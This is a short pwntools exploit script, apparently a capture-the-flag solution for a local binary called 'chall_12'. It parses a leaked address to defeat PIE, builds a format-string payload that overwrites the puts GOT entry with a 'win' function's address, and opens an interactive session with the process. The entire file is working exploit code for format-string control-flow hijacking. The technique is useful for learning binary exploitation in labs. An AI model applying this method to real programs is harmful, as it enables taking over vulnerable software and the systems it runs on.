from pwn import *

elf = ELF("./chall_12")

p = process('./chall_12')

p.recvuntil(b':')

leak = p.recv()

address = int(leak,16) - elf.sym.main

elf.address = address

payload = fmtstr_payload(7, {elf.got.puts:elf.sym.win})

p.sendline(payload)

p.interactive()
